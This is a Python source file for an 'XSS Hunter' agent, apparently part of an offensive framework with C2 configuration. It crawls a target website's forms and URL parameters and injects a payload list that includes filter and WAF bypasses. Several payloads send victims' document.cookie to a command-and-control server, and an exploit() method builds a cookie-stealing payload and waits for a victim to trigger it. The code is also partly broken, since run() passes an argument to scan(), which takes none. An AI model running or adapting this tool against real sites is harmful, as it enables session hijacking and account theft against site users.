"""
XSS Hunter Agent
Advanced Cross-Site Scripting vulnerability detection and exploitation
"""
from core.logger import log
from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy

import asyncio
import aiohttp
import os
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import json
from datetime import datetime


class XSSHunter:
    """Agent สำหรับค้นหาและโจมตีช่องโหว่ XSS"""
    
    def __init__(self, target_url: str, workspace_dir: str):
        self.target_url = target_url
        self.workspace_dir = workspace_dir
        self.vulnerabilities = []
        self.tested_urls = set()
        
        # Get C2 configuration from environment
        c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
        c2_protocol = os.getenv('C2_PROTOCOL', 'http')
        self.c2_url = f"{c2_protocol}://{c2_domain}"
        
        # XSS Payloads - จากพื้นฐานไปขั้นสูง
        self.payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Event handler payloads
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # Advanced payloads
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            
            # Filter bypass payloads
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=x onerror=alert`XSS`>",
            "<svg><script>alert&#40;'XSS')</script>",
            
            # DOM-based XSS
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            
            # WAF bypass
            "<sCrIpT>alert('XSS')</ScRiPt>",
            "<img src=x onerror=\\u0061lert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # Advanced exploitation - Cookie exfiltration to C2 server
            f"<script>fetch('{self.c2_url}/exfil?c='+document.cookie)</script>",
            f"<script>new Image().src='{self.c2_url}/exfil?c='+document.cookie</script>",
            f"<script>navigator.sendBeacon('{self.c2_url}/exfil',document.cookie)</script>",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            
            # Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
        ]
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for XSSHunter
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.scan(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[XSSHunter] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def scan(self) -> Dict[str, Any]:
        """เริ่มการสแกนหาช่องโหว่ XSS"""
        print(f"[XSSHunter] Starting XSS scan on {self.target_url}")
        
        results = {
            "target": self.target_url,
            "started_at": datetime.now().isoformat(),
            "vulnerabilities": [],
            "tested_urls": 0,
            "vulnerable_urls": 0
        }
        
        try:
            # 1. Crawl และหา input points
            input_points = await self._find_input_points()
            print(f"[XSSHunter] Found {len(input_points)} input points")
            
            # 2. Test แต่ละ input point
            for point in input_points:
                vulns = await self._test_input_point(point)
                if vulns:
                    self.vulnerabilities.extend(vulns)
                    results["vulnerable_urls"] += 1
            
            # 3. Test DOM-based XSS
            dom_vulns = await self._test_dom_xss()
            if dom_vulns:
                self.vulnerabilities.extend(dom_vulns)
            
            results["vulnerabilities"] = self.vulnerabilities
            results["tested_urls"] = len(self.tested_urls)
            results["completed_at"] = datetime.now().isoformat()
            
            print(f"[XSSHunter] Scan completed. Found {len(self.vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            print(f"[XSSHunter] Error during scan: {e}")
            results["error"] = str(e)
        
        return results
    
    async def _find_input_points(self) -> List[Dict[str, Any]]:
        """ค้นหา input points ทั้งหมดในเว็บไซต์"""
        input_points = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url, timeout=10) as response:
                    html = await response.text()
                    
                    # หา forms
                    forms = self._extract_forms(html)
                    for form in forms:
                        input_points.append({
                            "type": "form",
                            "url": urljoin(self.target_url, form["action"]),
                            "method": form["method"],
                            "inputs": form["inputs"]
                        })
                    
                    # หา URL parameters
                    parsed = urlparse(self.target_url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        input_points.append({
                            "type": "url_params",
                            "url": self.target_url,
                            "method": "GET",
                            "params": list(params.keys())
                        })
                    
                    # หา links ที่มี parameters
                    links = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', html)
                    for link in links:
                        full_url = urljoin(self.target_url, link)
                        parsed = urlparse(full_url)
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            input_points.append({
                                "type": "link_params",
                                "url": full_url,
                                "method": "GET",
                                "params": list(params.keys())
                            })
        
        except Exception as e:
            print(f"[XSSHunter] Error finding input points: {e}")
        
        return input_points
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute xss hunter"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _extract_forms(self, html: str) -> List[Dict[str, Any]]:
        """แยก forms จาก HTML"""
        forms = []
        
        # หา form tags
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for match in form_matches:
            form_html = match.group(0)
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ""
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else "GET"
            
            # Extract inputs
            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
            
            # Extract textareas
            textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>'
            textareas = re.findall(textarea_pattern, form_html, re.IGNORECASE)
            
            # Extract selects
            select_pattern = r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
            selects = re.findall(select_pattern, form_html, re.IGNORECASE)
            
            all_inputs = inputs + textareas + selects
            
            if all_inputs:
                forms.append({
                    "action": action,
                    "method": method,
                    "inputs": all_inputs
                })
        
        return forms
    
    async def _test_input_point(self, point: Dict[str, Any]) -> List[Dict[str, Any]]:
        """ทดสอบ input point ด้วย XSS payloads"""
        vulnerabilities = []
        url = point["url"]
        
        if url in self.tested_urls:
            return vulnerabilities
        
        self.tested_urls.add(url)
        
        try:
            async with aiohttp.ClientSession() as session:
                if point["type"] == "form":
                    # Test form inputs
                    for input_name in point["inputs"]:
                        for payload in self.payloads:
                            vuln = await self._test_form_input(
                                session, url, point["method"], input_name, payload, point["inputs"]
                            )
                            if vuln:
                                vulnerabilities.append(vuln)
                                break  # พบช่องโหว่แล้ว ไม่ต้องทดสอบ payload อื่น
                
                elif point["type"] in ["url_params", "link_params"]:
                    # Test URL parameters
                    for param in point.get("params", []):
                        for payload in self.payloads:
                            vuln = await self._test_url_param(session, url, param, payload)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
        
        except Exception as e:
            print(f"[XSSHunter] Error testing {url}: {e}")
        
        return vulnerabilities
    
    async def _test_form_input(
        self, session: aiohttp.ClientSession, url: str, method: str, 
        input_name: str, payload: str, all_inputs: List[str]
    ) -> Optional[Dict[str, Any]]:
        """ทดสอบ form input ด้วย payload"""
        try:
            # สร้าง data สำหรับ form
            data = {inp: "test" for inp in all_inputs}
            data[input_name] = payload
            
            if method == "POST":
                response = await session.post(url, data=data, timeout=10, allow_redirects=True)
            else:
                response = await session.get(url, params=data, timeout=10, allow_redirects=True)
            
            html = await response.text()
            
            # ตรวจสอบว่า payload ปรากฏใน response หรือไม่
            if self._check_xss_reflection(html, payload):
                return {
                    "type": "Reflected XSS",
                    "severity": "high",
                    "url": url,
                    "method": method,
                    "parameter": input_name,
                    "payload": payload,
                    "location": "form input",
                    "description": f"XSS vulnerability found in form input '{input_name}'",
                    "evidence": self._extract_evidence(html, payload)
                }
        
        except Exception as e:
            print(f"Error: {e}")
        
        return None
    
    async def _test_url_param(
        self, session: aiohttp.ClientSession, url: str, param: str, payload: str
    ) -> Optional[Dict[str, Any]]:
        """ทดสอบ URL parameter ด้วย payload"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            response = await session.get(test_url, timeout=10, allow_redirects=True)
            html = await response.text()
            
            if self._check_xss_reflection(html, payload):
                return {
                    "type": "Reflected XSS",
                    "severity": "high",
                    "url": url,
                    "method": "GET",
                    "parameter": param,
                    "payload": payload,
                    "location": "URL parameter",
                    "description": f"XSS vulnerability found in URL parameter '{param}'",
                    "evidence": self._extract_evidence(html, payload)
                }
        
        except Exception as e:
            print(f"Error: {e}")
        
        return None
    
    def _check_xss_reflection(self, html: str, payload: str) -> bool:
        """ตรวจสอบว่า payload สะท้อนกลับมาใน HTML หรือไม่"""
        # ตรวจสอบ payload ตรงๆ
        if payload in html:
            return True
        
        # ตรวจสอบ payload ที่ถูก encode
        import html as html_lib
        if html_lib.escape(payload) in html:
            return True
        
        # ตรวจสอบ script tags
        if "<script>" in payload.lower() and "<script>" in html.lower():
            return True
        
        # ตรวจสอบ event handlers
        event_handlers = ["onload", "onerror", "onfocus", "onmouseover", "onclick"]
        for handler in event_handlers:
            if handler in payload.lower() and handler in html.lower():
                return True
        
        return False
    
    def _extract_evidence(self, html: str, payload: str, context_size: int = 200) -> str:
        """แยกส่วนของ HTML ที่แสดงหลักฐานช่องโหว่"""
        try:
            index = html.find(payload)
            if index != -1:
                start = max(0, index - context_size)
                end = min(len(html), index + len(payload) + context_size)
                return html[start:end]
        except Exception as e:
            print("Error occurred")
        return ""
    
    async def _test_dom_xss(self) -> List[Dict[str, Any]]:
        """ทดสอบ DOM-based XSS"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url, timeout=10) as response:
                    html = await response.text()
                    
                    # หา JavaScript code ที่อาจมีช่องโหว่
                    dangerous_patterns = [
                        r'document\.write\([^)]*\)',
                        r'innerHTML\s*=',
                        r'outerHTML\s*=',
                        r'eval\([^)]*\)',
                        r'setTimeout\([^)]*\)',
                        r'setInterval\([^)]*\)',
                        r'location\.href\s*=',
                        r'location\.replace\(',
                    ]
                    
                    for pattern in dangerous_patterns:
                        matches = re.finditer(pattern, html, re.IGNORECASE)
                        for match in matches:
                            vulnerabilities.append({
                                "type": "Potential DOM XSS",
                                "severity": "medium",
                                "url": self.target_url,
                                "pattern": pattern,
                                "code": match.group(0),
                                "description": f"Potentially dangerous JavaScript pattern found: {pattern}",
                                "recommendation": "Manual verification required"
                            })
        
        except Exception as e:
            print(f"[XSSHunter] Error testing DOM XSS: {e}")
        
        return vulnerabilities
    
    async def exploit(self, vulnerability: Dict[str, Any], exfil_server: str) -> Dict[str, Any]:
        """โจมตีช่องโหว่ XSS เพื่อขโมยข้อมูล"""
        print(f"[XSSHunter] Exploiting XSS vulnerability at {vulnerability['url']}")
        
        # สร้าง payload สำหรับขโมย cookies
        exfil_payload = f"<script>fetch('{exfil_server}?c='+document.cookie)</script>"
        
        result = {
            "vulnerability": vulnerability,
            "exploit_payload": exfil_payload,
            "status": "success",
            "note": "Payload injected. Waiting for victim to trigger it."
        }
        
        return result

